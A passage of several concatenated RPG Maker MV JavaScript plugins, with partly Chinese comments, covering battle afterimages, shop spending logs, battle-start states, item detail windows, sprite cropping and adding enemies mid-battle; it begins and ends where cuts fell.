{ const a = window.Sprite_Battler_Afterimage = class _ extends Sprite{
	constructor(ref){
		super(ref._effectTarget.bitmap);
		this._lifetime=this._lifetimeMax=ref._afterimage_lifetime;
		this.alpha=this._ori_alpha=ref.alpha*ref._effectTarget.alpha;
		this.init_setLoc(ref);
	}
	update(){
		super.update();
		this.alpha=this._ori_alpha*--this._lifetime/this._lifetimeMax;
	}
};
const p=a.prototype;
(p.init_setLoc=function f(ref){
	const et=ref._effectTarget;
	//{ const frm=et._frame; this.setFrame(frm.x,frm.y,frm.width,frm.height); }
	this.x=ref.x;  this.y=ref.y;
	for(let x=0,t=f.tbl,m=[[ref,t.infosO,],[et,t.infosI,]];x!==m.length;++x){
		for(let i=0,arr=m[x][1];i!==arr.length;++i) f.tbl.cp(m[x][0],this,arr[i]);
	}
	this._refresh();
}).tbl={
	cp:(ref,newsp,info)=>{ for(let x=0,k=info[0],arr=info[1];x!==arr.length;++x) newsp[k][arr[x]]=ref[k][arr[x]]; },
	infosO:[
		['scale',['x','y',]],
	],
	infosI:[
		['anchor',['x','y',]],
		['_frame',['x','y','width','height',]],
		['_realFrame',['x','y','width','height',]],
	],
};
}

{ const p=Sprite_Battler.prototype;
k='initialize';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._afterimage_root=
	this._afterimage_en=
	undefined;
	return rtv;
}).ori=r;
p.afterimage_remove=function(){
	const rt=this._afterimage_root,delList=[];
	for(let x=0,xs=rt.children.length;x!==xs;++x){
		const sp=rt.getChildAt(x);
		if(!(sp._lifetime>0)) delList.push(sp);
	}
	while(delList.length) rt.removeChild(delList.pop());
};
p.afterimage_newSprite=function(){
	if(!this.alpha || !this.visible) return;
	if(!this._afterimage_root) this.parent.addChildAt(this._afterimage_root=new Sprite(),this.parent.getChildIndex(this));
	this._afterimage_root.addChild(new Sprite_Battler_Afterimage(this)); // img already loaded
};
k='update';
for(let x=0,arr=[Sprite_Actor,Sprite_Enemy],xs=arr.length;x!==xs;++x){ const p=arr[x].prototype;
// scale is reset by one of yep plugins
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._afterimage_root) this.afterimage_remove();
	if(this._afterimage_en && this.parent){
		this._afterimage_ctr|=0;
		if(!(this._afterimage_ctr++)) this.afterimage_newSprite();
		this._afterimage_ctr%=this._afterimage_itvl;
	}
	return rtv;
}).ori=r;
} // for
}

})();


﻿"use strict";
/*:
 * @plugindesc commandRemember
 * @author agold404
 *
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r;

{ const p=ConfigManager;
k='applyData';
r=p[k]; (p[k]=function f(){
	f.ori.apply(this,arguments);
	if(arguments[0].commandRemember===undefined) this.commandRemember = true;
}).ori=r;
p.commandRemember=true;
}

})();


﻿"use strict";
/*:
 * @plugindesc log money spent in shop
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Shop.prototype;
k='doBuy';
r=p[k]; (p[k]=function f(){
	const gold=$gameParty.gold();
	const rtv=f.ori.apply(this,arguments);
	$gameTemp._moneySpentInShop+=gold-$gameParty.gold();
	return rtv;
}).ori=r;
k='create';
r=p[k]; (p[k]=function f(){
	$gameTemp._moneySpentInShop=0;
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc 戰鬥開場獲得狀態之trait
 * @author agold404
 * @help <開場狀態:[[狀態id,排序]]>
 * <開場狀態:[[狀態id_1,排序1],[狀態id_2,排序2],...,[狀態id_n,排序n]]>
 * 排序越小者越早被加到角色身上
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kw='開場狀態';
const kwt='TRAIT_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataActors.forEach(f.forEach);
	$dataClasses.forEach(f.forEach);
	$dataWeapons.forEach(f.forEach);
	$dataArmors.forEach(f.forEach);
	$dataEnemies.forEach(f.forEach);
	$dataStates.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]){
		const kvv=JSON.parse(meta[kw]);
		for(let x=0,kv;x!==kvv.length;++x){
			kv=kvv[x];
			dataobj.traits.push({code:gbb[kwt],dataId:kv[0],value:kv[1]-0||0});
		}
	}
};
}

new cfc(Game_Battler.prototype).add('battleStartStates',function f(){
	// get state IDs
	return this.traits(f.tbl[0]).sort(f.tbl[1]).map(f.tbl[2]);
},[
gbb[kwt],
(a,b)=>a.value-b.value||a.dataId-b.dataId,
t=>t.dataId,
],false,true).add('onBattleStart_battleStartStates',function f(){
	this.battleStartStates().forEach(f.tbl[0],this);
},[
function(stateId){ this.addState(stateId); },
],false,true).add('onBattleStart',function f(){
	this.onBattleStart_battleStartStates();
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc shift顯示道具額外資訊 // edit MOG_SceneItem.js
 * @author agold404
 * @help 道具、裝備 <道具額外文字檔:從遊戲根目錄(有index.html的資料夾)開始的相對路徑>
 * <道具額外文字檔switch:[[開關id,"路徑"],[開關id,"路徑"] ,... ]>
 * 
 * This plugin can be renamed as you want.
 */

if(typeof Window_ItemListM!=='undefined')(()=>{ let k,r,t;

const kw="道具額外文字檔";
const kw_switch="道具額外文字檔switch";

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{
	const meta=dataobj&&dataobj.meta; if(!meta) return;
	if(meta[kw_switch]) dataobj[kw_switch]=JSON.parse(meta[kw_switch]);
},
]);

const tbl_windowColorTone_default_path='BLR_custom/detail/windowColorToneRGB_default.txt';
const tbl_windowColorTone_default_tone=[75, 142, 160, 0];
const tbl_windowColorTone_default=[
tbl_windowColorTone_default_path,
tbl_windowColorTone_default_path,
tbl_windowColorTone_default_tone,
];
const tbl_windowColorTone_item=t=tbl_windowColorTone_default.slice();
t[0]='BLR_custom/detail/windowColorToneRGB_item.txt';
const tbl_windowColorTone_skill=t=tbl_windowColorTone_default.slice();
t[0]='BLR_custom/detail/windowColorToneRGB_skill.txt';
const tbl_windowColorTone_equip=t=tbl_windowColorTone_default.slice();
t[0]='BLR_custom/detail/windowColorToneRGB_equip.txt';
const tbl_windowColorTone_shop=t=tbl_windowColorTone_default.slice();
t[0]='BLR_custom/detail/windowColorToneRGB_shop.txt';

new cfc(Scene_MenuBase.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._numberWindow=this._numberWindow;
	this._toDetail_using=false;
	this._detailWindow=undefined;
	this._toDetail_shouldShow=0;
	this._toDetail_showOnWindow_toPos=undefined;
	this._toDetail_showOnWindow_deltaPos=undefined;
	this._toDetail_disableToggle=false;
	return rtv;
}).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._toDetail_windowColorTone=undefined;
	this.toDetail_windowColorTone_load();
	return rtv;
}).add('toDetail_windowColorTone_getLoadTable',function f(){
	return f.tbl;
},tbl_windowColorTone_default).add('toDetail_windowColorTone_load',function f(){
	const tbl=this.toDetail_windowColorTone_getLoadTable();
	ImageManager.otherFiles_addLoad(tbl[0]);
	ImageManager.otherFiles_addLoad(tbl[1]);
}).add('toDetail_windowColorTone_getParsed',function f(){
	let rtv=this._toDetail_windowColorTone; if(rtv) return rtv;
	const tbl=this.toDetail_windowColorTone_getLoadTable();
	rtv=ImageManager.otherFiles_getData(tbl[0]);
	if(rtv===undefined){
		rtv=ImageManager.otherFiles_getData(tbl[1]);
		if(rtv===undefined){
			rtv=tbl[2];
		}else rtv=JSON.parse(rtv);
	}else rtv=JSON.parse(rtv);
	while(rtv.length<4) rtv.push(0);
	this._toDetail_windowColorTone=rtv;
	return rtv;
}).add('toDetail_getPath',function f(item){
	if(!item) return;
	let rtv;
	if($gameSwitches && item[kw_switch]){ for(let x=0,arr=item[kw_switch];x!==arr.length;++x){
		if($gameSwitches.value(arr[x][0])){
			rtv=arr[x][1];
			break;
		}
	} }
	if(rtv===undefined) rtv=item.meta[kw];
	return rtv;
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.toDetail_updatePos();
	return rtv;
}).add('toDetail_updatePos',function f(){
	if(!this._toDetail_using) return;
	const ow=this.toDetail_showOnWindow(),dw=this._detailWindow;
	if(!ow||!dw) return;
	if(!this._toDetail_otherDxy) this._toDetail_otherDxy={x:0,y:0,};
	const pos={x:ow.x,y:ow.y,w:ow.width,h:ow.height,},keys=f.tbl[0];
	{
		const toPos=this._toDetail_showOnWindow_toPos;
		if(toPos) for(let k=0;k!==keys.length;++k) if(!isNaN(toPos[keys[k]])) pos[keys[k]]=toPos[keys[k]];
	}
	{
		const deltaPos=this._toDetail_showOnWindow_deltaPos;
		if(deltaPos) for(let k=0;k!==keys.length;++k) if(!isNaN(deltaPos[keys[k]])) pos[keys[k]]+=deltaPos[keys[k]];
	}
	let editedSize=false;
	if(dw.x!==pos.x){ dw.x=pos.x; }
	if(dw.y!==pos.y){ dw.y=pos.y; }
	if(dw.width!==pos.w){ dw.width=pos.w; editedSize=true; }
	if(dw.height!==pos.h){ dw.height=pos.h; editedSize=true; }
	if(editedSize){
		if(dw.contents) dw.createContents(); // re-create canvas with size w,h
		this.toDetail_refreshBackSprite(true);
	}
},[
['x','y','w','h',],
],true,true).add('toDetail_showOnWindow',function f(){
	return undefined;
}).add('toDetail_getAnchorWindow',function f(){
	return undefined;
}).add('toDetail_getItemWindow',function f(){
	return undefined;
}).add('toDetail_getAnchorY',function f(){
	const w=this.toDetail_getAnchorWindow();
	return w?w.y:0;
}).add('toDetail_refreshBackSprite',function f(needRefresh){
	const dw=this._detailWindow; if(!dw) return;
	const b=dw._windowBackSprite; if(!b) return;
	b.setColorTone(this.toDetail_windowColorTone_getParsed());
	if(needRefresh) b._refresh();
}).add('toDetail_oncreate',function f(tbl){
	const iw=this.toDetail_getItemWindow(); if(!iw) return;
	this._toDetail_using=true;
	tbl=tbl||f.tbl;
	const dw=this._detailWindow=new Window_Base(tbl.x,tbl.y,tbl.w,tbl.h);
	this.toDetail_refreshBackSprite();
	this.toDetail_resetTxtOffsetY.call(dw);
	this.addChild(dw);
	dw.alpha=0;
	dw.update=f.tbl.update;
	dw.drawTextExTop=f.tbl.drawTextExTop;
	dw.processNormalCharacter=Window_Message.prototype.processNormalCharacter;
	{
		const k='standardFontSize';
		const r=dw[k]; (dw[k]=function f(){
			return (f.ori.apply(this,arguments)*3)>>2;
		}).ori=r;
	}
	dw.toDetail_resetTxtOffsetY=this.toDetail_resetTxtOffsetY;
	
	this._toDetail_ctr=0;
	this._toDetail_ctrMax=32;
	this._toDetail_stat=Input.isPressed('shift');
	this._toDetail_pos={
		x:tbl.ix,
		y:this.toDetail_getAnchorY(),
		x0:undefined,
		y0:undefined,
	};
	this._toDetail_otherDxy=undefined;
	this._toDetail_lastItem=undefined;
},{
update:function f(){
	const rtv=Window_Base.prototype.update.apply(this,arguments);
	if(++this._txtOffsetYWait>=this._txtOffsetYWaitMax){
		if(this._txtOffsetYLast!==this._txtOffsetY && this._txtOffsetYFcLast!==Graphics.frameCount){
			const bm=this.contents; bm && bm.clear();
			this.drawTextExTop(this._txt,this.textPadding(),this._txtOffsetY);
		}
		if(this._txtOffsetHeight>=this.contentsHeight()) this._txtOffsetY-=this._txtOffsetYSpeed;
		else if(++this._txtOffsetYWait2>=this._txtOffsetYWait2Max){
			this.toDetail_resetTxtOffsetY(this._txt);
			this.drawTextExTop(this._txt,this.textPadding(),this._txtOffsetY);
			if(this._txtOffsetHeight>=this.contentsHeight()) this._txtOffsetY+=this._txtOffsetY-=this._txtOffsetYSpeed;
		}
	}
	return rtv;
},
drawTextExTop:function f(txt,x,y){
	this._txt=txt;
	if(!this.alpha) return;
	const res={} , bm=this.contents; bm && bm.clear();
	const rtv=this.drawTextEx(txt,x,y,undefined,undefined,res);
	this._txtOffsetYLast=this._txtOffsetY;
	this._txtOffsetYFcLast=Graphics.frameCount;
	this._txtOffsetHeight=res.y+res.height;
},
x:400,
y:123,
w:400,
h:388,
ix:12,
}).add('toDetail_resetTxtOffsetY',function f(txt){
	this._txt=txt||f.tbl[0];
	this._txtLineHeight=0;
	this._txtOffsetHeight=0;
	this._txtOffsetY=0;
	this._txtOffsetYLast=-1;
	this._txtOffsetYFcLast=Graphics.frameCount;
	this._txtOffsetYWait=0;
	this._txtOffsetYWait2=0;
	this._txtOffsetYWaitMax=f.tbl[1];
	this._txtOffsetYWait2Max=f.tbl[2];
	this._txtOffsetYSpeed=f.tbl[3];
},[
'',
90,
120,
1,
]).add('toDetail_loadDetail_jurl',(url,method,callback,onerr)=>{
	const xhr = new XMLHttpRequest();
	const funcs={2:callback,4:onerr,5:onerr,};
	xhr.onreadystatechange = function(){
		if (this.readyState == 4) {
			const s=this.status.toString(); if(s.length!==3) return;
			const func=funcs[s.slice(0, 1)];
			if(func) func(this.responseText);
		}
	}
	;
	xhr.onerror=onerr;
	xhr.open(method, url, true);
	xhr.send(method === "GET" ? undefined : data);
}).add('toDetail_loadDetail',function f(){
	if(!this._toDetail_using) return;
	const iw=this.toDetail_getItemWindow(); if(!iw||!iw.active) return;
	const dw=this._detailWindow,item=iw.item();
	if(this._toDetail_lastItem===item) return;
	this._toDetail_lastItem=item;
	{
		dw.onclosed && dw.onclosed();
		const bm=dw.contents;
		bm && bm.clear();
	}
	if(!item) return dw.drawTextExTop(f.tbl.nullItem,dw.textPadding(),0);
	if(!item.detailTextMap) item.detailTextMap=new Map();
	dw.toDetail_resetTxtOffsetY();
	const path=this.toDetail_getPath(item); if(!path) return dw.drawTextExTop(f.tbl.noFile,dw.textPadding(),0);
	const detailTextCache=item.detailTextMap.get(path); if(detailTextCache) return dw.drawTextExTop(detailTextCache.txt,dw.textPadding(),0);
	
	dw.drawTextEx(f.tbl.loading,dw.textPadding(),0);
	this.toDetail_loadDetail_jurl(path,"GET",txt=>{
		item.detailTextMap.set(path,{txt:txt,});
		if(!iw.active || item!==iw.item()) return;
		const bm=dw.contents;
		bm && bm.clear();
		const res={};
		dw._txt=txt;
		dw.drawTextExTop(txt,dw.textPadding(),0,undefined,undefined,res);
	},()=>{
		if(!iw.active || item!==iw.item()) return;
		const bm=dw.contents;
		bm && bm.clear();
		dw._txt=f.tbl.loadFail;
		dw.drawTextExTop(f.tbl.loadFail,dw.textPadding(),0);
	});
},{
noFile:"\\TXTCENTER:\"\\{此項目沒有說明。\"",
loading:"\\TXTCENTER:\"\\{讀取說明中......\"",
loadFail:"\\TXTCENTER:\"\\{讀取說明失敗。\"",
nullItem:"",
}).add('toDetail_adjIwPos',function(lstPos){
	if(!this._toDetail_using) return;
	const dxy=this._toDetail_otherDxy;
	if(!dxy) return;
	const iw=this.toDetail_getItemWindow();
	if(this._toDetail_stat=iw.active && this._toDetail_shouldShow){
		if(this._toDetail_ctr<this._toDetail_ctrMax) ++this._toDetail_ctr;
		else this._toDetail_ctr=this._toDetail_ctrMax;
	}else{
		if(this._toDetail_ctr>0) --this._toDetail_ctr;
		else this._toDetail_ctr=0;
	}
	const c=this._toDetail_ctrMax,a=this._toDetail_ctr,b=c-a;
	const p=this._toDetail_pos;
	const aw=this.toDetail_getAnchorWindow();
	if(aw && p){
		// cal. final dst , add effect shift
		aw.x=(p.x*a+p.x0*b)/c+dxy.x;
		aw.y=(p.y*a+p.y0*b)/c+dxy.y;
	}
	// 
	if(this._itemPosOrg){
		this._itemPosOrg[0]=(a*p.x+p.x0*b)/c;
		this._itemPosOrg[1]=(a*p.y+p.y0*b)/c;
	}
	// 
	this._detailWindow.alpha=this._toDetail_ctr/this._toDetail_ctrMax;
}).add('toDetail_disableToggle',function f(){
	return this._toDetail_disableToggle || (this._numberWindow && this._numberWindow.active);
});

for(let x=0,arr=[Scene_Skill,Scene_MenuBase,Scene_Equip,];x!==arr.length;++x) new cfc(arr[x].prototype).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(!this._toDetail_using){
		if(this._detailWindow){
			this._detailWindow.alpha=0;
			this._toDetail_ctr=0;
		}
		return rtv;
	}
	if(!this.toDetail_disableToggle()&&Input.isTriggered('shift')) this._toDetail_shouldShow^=1;
	this.toDetail_adjIwPos(this._lstPos_iw);
	if(this._toDetail_ctr) this.toDetail_loadDetail();
	return rtv;
});

for(let x=0,arr=[Scene_Skill,Scene_Item,];x!==arr.length;++x) new cfc(arr[x].prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.toDetail_oncreate();
	return rtv;
}).add('updateItemWindow',function f(){ // for MOG
	const aw=this.toDetail_getAnchorWindow();
	const x=aw.x,y=aw.y;
	const rtv=f.ori&&f.ori.apply(this,arguments);
	if(!this._toDetail_using) return rtv;
	const dxy=this._toDetail_otherDxy;
	if(dxy){
		dxy.x+=aw.x-x;
		dxy.y+=aw.y-y;
	}else if(!this._wani[0]){
		this._toDetail_otherDxy={x:0,y:0,};
		const p=this._toDetail_pos;
		p.x0=aw.x;
		p.y0=aw.y;
	}
	return rtv;
}).add('toDetail_getAnchorWindow',function f(){
	return this._itemWindow;
},undefined,true,true).add('toDetail_getItemWindow',function(){
	return this._itemWindow;
},undefined,true,true);

new cfc(Scene_Equip.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._statusWindow.active=false;
	this.toDetail_oncreate();
	const posTbl=Scene_MenuBase.prototype.toDetail_oncreate.tbl;
	this._toDetail_showOnWindow_toPos={
		w:posTbl.w,
		h:posTbl.h,
	};
	// custom adjust
	this._create_customAdjust();
	return rtv;
}).add('_create_customAdjust',function f(){
	this._toDetail_showOnWindow_deltaPos={
		y:-99,
		h:99,
	};
	if(window.Imported && Imported.MOG_SceneEquip){
		if(this._layoutHelp && this._helpWindow){
			this.addChild(this._layoutHelp);
			this.addChild(this._helpWindow);
		}
	}
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.toDetail_updatePos();
	return rtv;
}).add('toDetail_showOnWindow',function f(){
	return this._statusWindow;
}).add('toDetail_getItemWindow',function f(){
	let rtv=this._slotWindow;
	if(rtv.active && rtv.visible && rtv.alpha) return rtv;
	rtv=this._itemWindow;
	if(rtv.active && rtv.visible && rtv.alpha) return rtv;
	return this._statusWindow;
},true,true).add('toDetail_getAnchorWindow',function(){
	return undefined;
},undefined,true,true);

new cfc(Scene_Shop.prototype).add('create',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._dummyWindow.active=false;
	this.toDetail_oncreate();
	return rtv;
}).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.toDetail_updatePos();
	return rtv;
}).add('toDetail_showOnWindow',function f(){
	let rtv=this._statusWindow;
	if(rtv.visible && rtv.alpha) return rtv;
	rtv=this._sellWindow;
	if(rtv.visible && rtv.alpha) return rtv;
	return this._statusWindow;
}).add('toDetail_getItemWindow',function f(){
	const func=f.tbl[this._commandWindow.currentSymbol()];
	return func?func.call(this):this._dummyWindow;
},{
null:function(){ return this._dummyWindow; },
buy:function(){ return this._buyWindow; },
sell:function(){ return this._sellWindow; },
},true,true).add('toDetail_getAnchorWindow',function(){
	return undefined;
},undefined,true,true);

new cfc(Scene_Item.prototype).add('toDetail_windowColorTone_getLoadTable',function f(){
	return f.tbl;
},tbl_windowColorTone_item,true,true);
new cfc(Scene_Skill.prototype).add('toDetail_windowColorTone_getLoadTable',function f(){
	return f.tbl;
},tbl_windowColorTone_skill,true,true);
new cfc(Scene_Equip.prototype).add('toDetail_windowColorTone_getLoadTable',function f(){
	return f.tbl;
},tbl_windowColorTone_equip,true,true);
new cfc(Scene_Shop.prototype).add('toDetail_windowColorTone_getLoadTable',function f(){
	return f.tbl;
},tbl_windowColorTone_shop,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc 在技能或道具中新增一個執行 javascript 的效果，於 Game_Action.applyItemEffect 中被使用
 * @author agold404
 * @help <effect_javascript:函式>
 * 函式參數：(動作主體，動作目標)。
 * 回傳值：成功請回傳 false-like ；失敗請回傳 true-like 。
 * 由於 meta 的 parsing 方式，請勿使用 arrow function 。
 * 請於函式前後使用括號以利透過 eval 產生該函式。
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gact=Game_Action,kw='effect_javascript';
const kwe='EFFECT_'+kw;

if(!gact._enumMax) gact._enumMax=404;
if(!gact.addEnum) gact.addEnum=window.addEnum;
gact.
	addEnum(kwe).
	addEnum('__END__');

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	// order: editor menu
	$dataSkills.forEach(f.forEach);
	$dataItems.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const meta=dataobj.meta;
	if(meta[kw]) dataobj.effects.push({code:gact[kwe],dataId:0,value1:0,value2:0,txt:meta[kw]});
};
}

{ const p=Game_Action.prototype;
k='applyItemEffect';
r=p[k]; (p[k]=function f(){
	const func=f.tbl[arguments[1].code];
	if(func) return func.apply(this,arguments);
	else f.tbl[arguments[1].code]=undefined;
}).ori;
p[k].tbl=[];
p[k].tbl[Game_Action.EFFECT_RECOVER_HP]=function(target,effect){
	this.itemEffectRecoverHp(target, effect);
};
p[k].tbl[Game_Action.EFFECT_RECOVER_MP]=function(target,effect){
	this.itemEffectRecoverMp(target, effect);
};
p[k].tbl[Game_Action.EFFECT_GAIN_TP]=function(target,effect){
	this.itemEffectGainTp(target, effect);
};
p[k].tbl[Game_Action.EFFECT_ADD_STATE]=function(target,effect){
	this.itemEffectAddState(target, effect);
};
p[k].tbl[Game_Action.EFFECT_REMOVE_STATE]=function(target,effect){
	this.itemEffectRemoveState(target, effect);
};
p[k].tbl[Game_Action.EFFECT_ADD_BUFF]=function(target,effect){
	this.itemEffectAddBuff(target, effect);
};
p[k].tbl[Game_Action.EFFECT_ADD_DEBUFF]=function(target,effect){
	this.itemEffectAddDebuff(target, effect);
};
p[k].tbl[Game_Action.EFFECT_REMOVE_BUFF]=function(target,effect){
	this.itemEffectRemoveBuff(target, effect);
};
p[k].tbl[Game_Action.EFFECT_REMOVE_DEBUFF]=function(target,effect){
	this.itemEffectRemoveDebuff(target, effect);
};
p[k].tbl[Game_Action.EFFECT_SPECIAL]=function(target,effect){
	this.itemEffectSpecial(target, effect);
};
p[k].tbl[Game_Action.EFFECT_GROW]=function(target,effect){
	this.itemEffectGrow(target, effect);
};
p[k].tbl[Game_Action.EFFECT_LEARN_SKILL]=function(target,effect){
	this.itemEffectLearnSkill(target, effect);
};
p[k].tbl[Game_Action.EFFECT_COMMON_EVENT]=function(target,effect){
	this.itemEffectCommonEvent(target, effect);
};
p[k].tbl[gact[kwe]]=function(target,effect){
	this.itemEffectJavascript(target,effect);
};
p.itemEffectJavascript=function(target,effect){
	if(!effect.func) effect.func=eval(effect.txt);
	if(!effect.func.call(this,this.subject(),target)) this.makeSuccess(target);
};
}

})();


﻿"use strict";
/*:
 * @plugindesc sprite_chr可設定切掉周圍一些
 * @author agold404
 * @help 調整 Game_Character._patternRect (Sprite_Character會去抓) ( [左界,上界,右界,下界] ，原左上界為 (0,0) ，原右下界為 (1,1) ，線性映射 )
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Game_Character.prototype;
k='initMembers';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	this._patternRect=[0,0,1,1];
	return rtv;
}).ori=r;
(p.patternRect=function f(){
	return this._patternRect||f.tbl.slice();
}).tbl=[0,0,1,1];
}

new cfc(Sprite_Character.prototype).add('initMembers',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._patternRect=[0,0,1,1]; // 1,1 = ori pw,ph
	return rtv;
}).add('patternRect',function(){
	return this._character.patternRect();
},undefined,true,true).add('updateCharacterFrame',function f(){
	this.updateHalfBodySprites();
	const pw = this.patternWidth () ;
	const ph = this.patternHeight() ;
	const sx = (this.characterBlockX() + this.characterPatternX()) * pw ;
	const sy = (this.characterBlockY() + this.characterPatternY()) * ph ;
	const rect = this.patternRect();
	const x = sx+~~(pw*rect[0]);
	const y = sy+~~(ph*rect[1]);
	const w = ~~((rect[2]-rect[0])*pw);
	const h = ~~((rect[3]-rect[1])*ph);
	if (this._bushDepth > 0) {
		const d = this._bushDepth;
		if(d>=h){
			this._upperBody.setFrame(x, y, 0, ph);
			this._lowerBody.setFrame(x, y, w, h);
		}else{
			this._upperBody.setFrame(x, y, w, h - d);
			this._lowerBody.setFrame(x, y + h - d, w, d);
		}
		this.setFrame(sx, sy, 0, ph);
	} else {
		this.setFrame(x, y, w, h);
	}
},undefined,true,true).add('updateTileFrame',function(){
	const pw = this.patternWidth();
	const ph = this.patternHeight();
	const sx = (((this._tileId>>4)&8) + (this._tileId&7)) * pw;
	const sy = (((this._tileId>>3)&15)) * ph;
	const rect = this.patternRect();
	const x = sx+~~(pw*rect[0]);
	const y = sy+~~(ph*rect[1]);
	const w = ~~((rect[2]-rect[0])*pw);
	const h = ~~((rect[3]-rect[1])*ph);
	this.setFrame(x, y, w, h);
},undefined,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc 變更原廠ㄓㄓ設定
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=ScreenSprite.prototype;
k='setColor';
r=p[k]; (p[k]=function f(r,g,b,a){
	if(this._red !== r || this._green !== g || this._blue !== b){
		this._red = r = Math.round(r || 0).clamp(0, 255);
		this._green = g = Math.round(g || 0).clamp(0, 255);
		this._blue = b = Math.round(b || 0).clamp(0, 255);
		this._alpha = a = ((a-1).clamp(-1,0)||0)+1;
		
		const intColor = this._colorVal = (r << 16) | (g << 8) | b , graphics = this._graphics;
		graphics.clear();
		graphics.beginFill(intColor, a);
		graphics.drawRect(0, 0, Graphics.width, Graphics.height);
	}
}).ori;
}

})();


﻿"use strict";
/*:
 * @plugindesc Game_Troop.prototype.addMember(id)
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

k='addMember';
{ const p=Game_Party.prototype;
r=p[k]; (p[k]=function(){
	return this.addActor.apply(this,arguments);
}).ori=r;
}

{ const p=Game_Troop.prototype;
r=p[k]; (p[k]=function(id,x,y,int_appearingFrame){
	const arr=this._enemies;
	const idx=arr.push(new Game_Enemy(id,x,y))-1;
	const btlr=arr[idx];
	
	const sc=SceneManager._scene; if(!sc||sc.constructor!==Scene_Battle) return btlr;
	const sps=sc._spriteset; if(!sps) return btlr;
	btlr.onBattleStart();
	btlr._addMember_dynamicAdded=true;
	btlr._addMember_appearingFrame = 0;
	btlr._addMember_appearingFrameMax = int_appearingFrame===undefined?64:int_appearingFrame;
	const sp=new Sprite_Enemy(btlr);
	sps._battleField.addChild(sp);
	sps._enemySprites.push(sp);
	const hpf=sps._hpField; if(hpf){
		const hpgsp=new HPGaugeSprite(sp,1);
		sps._HPSprites[idx]=hpgsp;
		hpf.addChild(hpgsp);
	}
	return btlr;
}).ori=r;
}

{ const p=Sprite_Enemy.prototype;
k='update';
r=p[k]; (p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._battler._addMember_dynamicAdded){
		const btlr=this._battler;
		let end=false;
		if(btlr._addMember_appearingFrameMax>0){
			this.alpha = ++btlr._addMember_appearingFrame / btlr._addMember_appearingFrameMax;
			if(btlr._addMember_appearingFrame>=btlr._addMember_appearingFrameMax) end=true;
		}else end=true;
		if(end){
			btlr._addMember_dynamicAdded=0;
			this.alpha=1;
		}
	}
	return rtv;
}).ori=r;
}

})();


﻿"use strict";
/*:
 * @plugindesc use troop.meta.appearRate to determine which enemies will show when player entering the battle each time
 * @author agold404
 * @help troop.meta.appearRate={"memberIndexFrom0":rate_between_0_and_1}
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataTroops.forEach(f.forEach); // in rpg_scenes.js: setup $gameTroop
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=dataobj=>{ if(!dataobj) return;
	const ar_str = dataobj.meta && dataobj.meta.appearRate;
	if(ar_str){
		const data=JSON.parse(ar_str);
		const arr=dataobj.appearRate=[];
		for(let i in data) arr.push([i,data[i]]);
	}else dataobj.appearRate=undefined;
};
}

{ const p=Game_Troop.prototype;
k='setup';
r=p[k]; (p[k]=function f(){
	const t=$dataTroops[arguments[0]];
	const ar = t && t.appearRate ;
	if(ar){
		if(ar.length!==t.members.length) alert("troop "+arguments[0]+" members.length !== appearRate.length");
		for(let x=0,xs=Math.min(ar.length,t.members.length);x!==xs;++x) t.members[ar[x][0]].hidden=Math.random()>=ar[x][1];
		let s=0,arr=t.members;
		for(let x=0;x!==arr.length;++x) s+=arr[x].hidden;
